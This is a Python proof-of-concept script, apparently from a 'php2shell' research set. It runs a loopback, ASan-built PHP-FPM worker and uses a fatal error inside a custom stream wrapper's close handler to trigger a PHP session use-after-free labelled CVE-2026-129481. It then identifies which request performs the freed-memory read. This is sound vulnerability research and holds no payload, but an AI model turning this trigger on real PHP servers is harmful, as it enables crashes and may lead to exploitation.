#!/usr/bin/env python3
"""Prove WHICH request the CVE-2026-129481 UAF read occurs in.

Four FastCGI requests on one static worker:
  baseline (probe.php) -> plain echo pid
  req1     (worker.php) -> fatal in stream_close at RSHUTDOWN
  mid      (mid.php)    -> writes a marker file at the top of its PHP body,
                           then echoes pid
  req2     (reuse.php)  -> session_start, echoes pid

A present marker carrying the req1 worker's PID, with an empty mid response
and a fresh req2 PID, proves the worker completed req1's shutdown, entered
the mid request, and aborted in the mid request's module-deactivation pass.
An absent marker with a delivered req1 response would instead mean the worker
died inside req1's own shutdown.

Usage: python3 php2shell-cve129481-mechanism.py FPM_BIN PORT [OUTDIR]
Loopback only; ASan build required (the verdict reads ASan's stderr).
"""
import os
import pathlib
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import time

HERE = pathlib.Path(__file__).resolve().parent
CLIENT = HERE / 'php2shell-fpm-client.py'
SID = 'poc129481m'
WORKER = r'''<?php
class FatalCloseM {
    public $context;
    public function stream_open($p,$m,$o,&$x) { return true; }
    public function stream_read($n) { return ''; }
    public function stream_write($d) { return strlen($d); }
    public function stream_eof() { return true; }
    public function stream_seek($o,$w) { return false; }
    public function stream_tell() { return 0; }
    public function stream_stat() { return array(); }
    public function stream_close() { nonexistent_function_for_fatal_129481(); }
}
stream_wrapper_register('fatalwrapm', 'FatalCloseM');
session_start();
$_SESSION['stream'] = fopen('fatalwrapm://x', 'r');
unset($_SESSION);
echo "req1:done:" . getmypid() . "\n";
'''
PROBE = r'''<?php echo "probe:" . getmypid() . "\n";'''
MID = r'''<?php
file_put_contents(getenv('MID_MARKER'), "mid-entered-pid=" . getmypid() . "\n");
echo "mid:" . getmypid() . "\n";
'''
REUSE = r'''<?php session_start(); echo "req2:done:" . getmypid() . "\n";'''


def wait_port(port, tries=150):
    for _ in range(tries):
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=0.1):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def fcgi(port, script, cookie=None, env=None):
    cmd = [sys.executable, str(CLIENT), str(port), str(script)]
    if cookie:
        cmd += ['--param', 'HTTP_COOKIE=PHPSESSID=' + cookie]
    cp = subprocess.run(cmd, capture_output=True, timeout=25, env=env)
    return cp.stdout.decode(errors='replace')


def main():
    fpm = pathlib.Path(sys.argv[1]).resolve()
    port = int(sys.argv[2])
    outdir = pathlib.Path(sys.argv[3]).resolve() if len(sys.argv) > 3 else None
    d = pathlib.Path(tempfile.mkdtemp(prefix='cve129481m-'))
    sess, www = d / 'sess', d / 'www'
    sess.mkdir(); www.mkdir()
    mark = d / 'mid-marker'
    (www / 'worker.php').write_text(WORKER)
    (www / 'probe.php').write_text(PROBE)
    (www / 'mid.php').write_text(MID)
    (www / 'reuse.php').write_text(REUSE)
    conf = f'''[global]
error_log = {d}/fpm-error.log
daemonize = no
log_level = notice
pid = {d}/fpm.pid
process_control_timeout = 2

[www]
listen = 127.0.0.1:{port}
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
env[USE_ZEND_ALLOC] = 0
env[USE_TRACKED_ALLOC] = 1
php_admin_value[opcache.enable] = 0
php_admin_value[memory_limit] = 16M
php_admin_value[max_execution_time] = 0
php_admin_value[display_errors] = 1
php_admin_value[log_errors] = 1
php_admin_value[error_reporting] = 32767
php_admin_value[html_errors] = 0
php_admin_value[session.save_path] = {sess}
php_admin_value[session.name] = PHPSESSID
php_admin_value[session.use_cookies] = 1
php_admin_value[session.use_strict_mode] = 0
php_admin_value[session.cache_limiter] =
'''
    (d / 'fpm.conf').write_text(conf)
    env = dict(os.environ)
    env.update(USE_ZEND_ALLOC='0', USE_TRACKED_ALLOC='1',
               ASAN_OPTIONS='detect_leaks=0:abort_on_error=1:allocator_may_return_null=1',
               UBSAN_OPTIONS='halt_on_error=1', MID_MARKER=str(mark))
    cmd = [str(fpm), '-n', '-F', '-y', str(d / 'fpm.conf'),
           '-d', 'error_log=' + str(d / 'php-error.log')]
    with (d / 'fpm-stdout.log').open('wb') as fo:
        gp = subprocess.Popen(cmd, env=env, stdout=fo, stderr=subprocess.STDOUT,
                              start_new_session=True)
        try:
            if not wait_port(port):
                raise RuntimeError('FPM never bound 127.0.0.1:%d' % port)
            base = fcgi(port, www / 'probe.php', env=env)
            req1 = fcgi(port, www / 'worker.php', cookie=SID, env=env)
            mid = fcgi(port, www / 'mid.php', env=env)
            req2 = fcgi(port, www / 'reuse.php', cookie=SID, env=env)
            time.sleep(1)
        finally:
            try:
                gp.wait(timeout=5)
            except subprocess.TimeoutExpired:
                os.killpg(gp.pid, signal.SIGKILL)
                gp.wait()
    err = (d / 'fpm-error.log').read_text(errors='replace')
    lines = ['build=%s mode=mechanism' % fpm,
             '=== responses ===',
             'baseline: ' + repr(base.strip()),
             'req1    : ' + repr(req1.strip()[:120]),
             'mid     : ' + repr(mid.strip()[:120]),
             'req2    : ' + repr(req2.strip()[:120]),
             '=== marker ===',
             'mid-marker exists: %s %s' % (mark.exists(),
                                           mark.read_text() if mark.exists() else ''),
             '=== ASan attribution (worker PIDs) ===']
    lines += ['  ' + l[:200] for l in err.splitlines()
              if 'AddressSanitizer' in l or 'READ of size' in l]
    lines += ['=== verdict ===',
              'MARKER_PRESENT => worker entered mid request; UAF read in mid shutdown'
              if mark.exists() else
              'MARKER_ABSENT => worker died before mid body; UAF read in req1 shutdown']
    text = '\n'.join(lines) + '\n'
    if outdir:
        outdir.mkdir(parents=True, exist_ok=True)
        (outdir / 'mechanism.log').write_text(
            text + '\n=== fpm-error.log ===\n' + err)
        shutil.copy(mark, outdir / 'mid-marker') if mark.exists() else None
    print(text, end='')
    shutil.rmtree(d, ignore_errors=True)


if __name__ == '__main__':
    main()
